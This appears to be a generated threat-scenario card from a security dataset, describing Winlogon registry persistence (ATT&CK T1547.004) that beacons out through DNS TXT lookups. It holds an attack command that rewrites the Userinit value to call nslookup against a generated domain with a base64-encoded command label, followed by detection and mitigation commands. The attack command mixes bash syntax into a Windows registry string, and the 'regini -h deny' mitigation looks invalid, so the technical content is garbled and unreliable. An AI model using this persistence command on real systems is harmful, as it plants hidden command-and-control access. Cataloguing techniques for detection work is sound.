---
type: campaign
scenario_id: 399
tactic: Persistence
technique: "T1547.004: Winlogon"
technique_id: T1547.004
tags: [campaign, lotl, persistence]
---

# Modifying Winlogon registry for DNS tunneling persistence.

## Threat Description
Modifying Winlogon registry for DNS tunneling persistence.

## Attack Command
```
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)" /f
```

## Detection Logic
Monitor Winlogon registry: `reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon | findstr nslookup`; Event ID 4657.

## Mitigation
Restrict Winlogon writes: `regini -h deny HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect Winlogon registry modifications for DNS tunneling by analyzing nslookup TXT commands, base64-encoded subdomains, and registry changes; suggest registry protections.

## References
- MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
